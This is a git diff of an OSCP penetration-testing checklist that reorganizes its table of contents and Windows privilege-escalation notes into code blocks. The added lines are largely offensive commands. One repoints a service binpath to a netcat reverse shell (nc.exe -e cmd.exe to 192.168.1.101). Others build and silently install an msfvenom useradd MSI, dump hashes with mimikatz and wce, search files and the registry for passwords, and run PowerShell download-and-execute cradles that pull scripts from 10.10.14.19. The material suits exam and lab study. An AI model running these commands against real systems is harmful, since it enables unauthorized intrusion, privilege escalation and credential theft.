@@ -4,17 +4,18 @@
   - [SNMP](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#snmp)
   - [SMTP](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#smtp)
 - [Investigate Other Services](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#investigate-other-services)
-  -  [FTP]
-  -  [SSH]
-  -  [HTTPS]
+  -  [FTP](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#ftpftp)
+  -  [SSH](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#ssh---likely-nothing-except-a-logon-vector-from-enumerated-usernames)
+  -  [HTTPS](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#https---heartbleed--crime--other-similar-attacks)
 - [Enumerating HTTP](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#enumerating-http)
   - [Logon Page](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#logon-page)
 - [Enumerate Web Application](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#enumerate-web-application)
-  - [WebDAV]
-  - [LFI]
-  - [PHP Wrappers]
-  - [RFI]
-  - [WFuzz]
+  - [WebDAV](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#webdav)
+  - [LFI](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#lfirfi)
+    - [Other PHP Wrappers](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#other-php-wrappers)\
+    - [Interesting File locations to try](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#interesting-file-locations-to-try)
+  - [RFI](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#rfi)
+  - [WFuzz](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#wfuzz)
 - [SQLi](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#sqli)
 - [OS Command Injection](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#os-command-injection)
 - [Remote Code Execution](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#remote-code-execution-now-for-a-shell)
@@ -22,8 +23,8 @@
 - [Buffer Overflow Dev](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#buffer-overflow---exploit-development)
 - [Privilege Escalation Exploits](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#privilege-escalation---exploits)
 - [Privilege Escalation Basic Enumeration](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#priv-esc-basic-enumeration)
-- [PrivEsc - Windows Checklist]
-- [PrivEsc - Linux Checklist]
+- [PrivEsc - Windows Checklist]()
+- [PrivEsc - Linux Checklist]()
 - [Essential Reading](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#essential-reading)
 * * * 
 
@@ -506,7 +507,8 @@ tasklist /v /fi "username eq system"
 schtasks /query /fo LIST /v
 ```
 #### Password hashes
-```wce -w
+```
+wce -w
 fgdumd
 mimikatz.exe
 ```
@@ -529,78 +531,103 @@ netsh firewall add portopening TCP 80 "Open Port 80"
 https://toshellandback.com/2015/11/24/ms-priv-esc/
 
 #### Services we can modify binpath
-- accesschk.exe -uwcqv "Authenticated Users" * /accepteula
-(weak service permissions for all authenticated users)
-- accesschk.exe -uwcqv "John" * -accepteula (weak service
-permissions for specific user)
+```accesschk.exe -uwcqv "Authenticated Users" * /accepteula``` - (weak service permissions for all authenticated users)
 
-- sc qc upnphost
-- sc config upnphost binpath= "C:\Inetpub\nc.exe
+```accesschk.exe -uwcqv "John" * -accepteula``` - (weak service permissions for specific user)
+
+```
+sc qc upnphost
+sc config upnphost binpath= "C:\Inetpub\nc.exe
 192.168.1.101 6666 -e c:\Windows\system32\cmd.exe"
-■ OR “net user /add” OR a msfvenom revshell (vbs or exe)
-- sc config upnphost obj= ".\LocalSystem" password= ""
-- sc config upnphost depend= ""
-- Sc upnphost stop; sc upnphost start
-#### Unquoted Service Paths - race condition
-- wmic service get name,displayname,pathname,startmode |findstr /i "Auto"
-|findstr /i /v "C:\Windows\\" |findstr /i /v """
-- icacls c:\program\SLMail\
-- msfvenom -f exe -o pop3.exe
-#### Further service enumeration
-- net start
-- tasklist /SVC
-- sc query state= all
-- sc qc upnphost
-- Get-WmiObject win32_service | select Name, DisplayName, State, PathName | Out-File
-- dir C:\windows\system32 /Q | find "BOB" (find sys-files owned by BOB)
-#### Always Install Elevated
-- reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-- reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-- Msfvenom -p windows/useradd user=lemon pass=pass -f evil.msi > evil.msi
-- msiexec /quiet /qn /I c:evil.msi
-#### Credential search
-- findstr /si password *.txt/xml/ini
-- dir /s *pass* == *cred* == *vnc* == *.config*
-- findstr /spin "password" *.*
-- reg query HKLM /f password /t REG_SZ /s
-- reg query HKLM /f password /t REG_SZ /s
-- Look for unattend(ed) and sysprep xml/ini files
-■ C:\Windows\Panther\
-■ C:\Windows\Panther\Unattend\
-■ C:\Windows\System32\
-■ C:\Windows\System32\sysprep\
-#### Accesschk - file permissions
+```
 
-- accesschk.exe -uwdqs Users c:
-- accesschk.exe -uwdqs "Authenticated Users" c:\ (weak folder permissions)
-- accesschk.exe -uwqs Users c:*.*
-- accesschk.exe -uwqs "Authenticated Users" c:*.* (weak file permissions)
+
+OR ```“net user /add”``` OR a msfvenom revshell (```.vbs``` or ```.exe```):
+
+```
+sc config upnphost obj= ".\LocalSystem" password= ""
+sc config upnphost depend= ""
+Sc upnphost stop; sc upnphost start
+```
+
+#### Unquoted Service Paths - race condition
+
+```
+wmic service get name,displayname,pathname,startmode |findstr /i "Auto" 
+|findstr /i /v "C:\Windows\\" |findstr /i /v """
+icacls c:\program\SLMail\
+msfvenom -f exe -o pop3.exe
+```
+
+#### Further service enumeration
+```
+net start
+tasklist /SVC
+sc query state= all
+sc qc upnphost
+Get-WmiObject win32_service | select Name, DisplayName, State, PathName | Out-File
+dir C:\windows\system32 /Q | find "BOB" (find sys-files owned by BOB)
+```
+
+#### Always Install Elevated
+```
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+Msfvenom -p windows/useradd user=lemon pass=pass -f evil.msi > evil.msi
+msiexec /quiet /qn /I c:evil.msi
+```
+
+#### Credential search
+```
+findstr /si password *.txt/xml/ini
+dir /s *pass* == *cred* == *vnc* == *.config*
+findstr /spin "password" *.*
+reg query HKLM /f password /t REG_SZ /s
+reg query HKLM /f password /t REG_SZ /s
+```
+
+- Look for unattend(ed) and sysprep xml/ini files
+```
+C:\Windows\Panther\
+C:\Windows\Panther\Unattend\
+C:\Windows\System32\
+C:\Windows\System32\sysprep\
+```
+
+#### Accesschk - file permissions
+```
+accesschk.exe -uwdqs Users c:
+accesschk.exe -uwdqs "Authenticated Users" c:\ (weak folder permissions)
+accesschk.exe -uwqs Users c:*.*
+accesschk.exe -uwqs "Authenticated Users" c:*.* (weak file permissions)
+```
 
 #### Scripts
 - https://github.com/pentestmonkey/windows-privesc-check
 - https://github.com/GDSSecurity/Windows-Exploit-Suggester
 - https://github.com/M4ximuss/Powerless
 - https://github.com/rasta-mouse/Sherlock
-#### Precompiled exploits
 
+#### Precompiled exploits
 - https://github.com/SecWiki/windows-kernel-exploits/
 - https://github.com/abatchy17/WindowsExploits
 
 #### Powershell
-- powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive
--NoProfile -File file.ps1
-- powershell.exe -nop -exec bypass -c "IEX (New-Object
-Net.WebClient).DownloadString('http://10.10.14.19:8080/PowerUp.ps1'
-);Invoke-AllChecks"
-- echo "IEX(New-Object
-Net.WebClient).DownloadString('http://10.10.14.19:8080/Sherlock.ps1
-')" | powershell -noprofile -
+```
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive
+NoProfile -File file.ps1
+powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.19:8080/PowerUp.ps1');Invoke-AllChecks"
+echo "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.19:8080/Sherlock.ps1')" | powershell -noprofile -
+```
 
 # Priv-Esc (Linux) Check-List
 #### OS – Version and Architecture
-- uname –a
-- cat /etc/*-release
-- lsb_release –a (Debian)
+```
+uname –a
+cat /etc/*-release
+lsb_release –a (Debian)
+```
+
 #### Current user and privileges
 - id
 - pwd
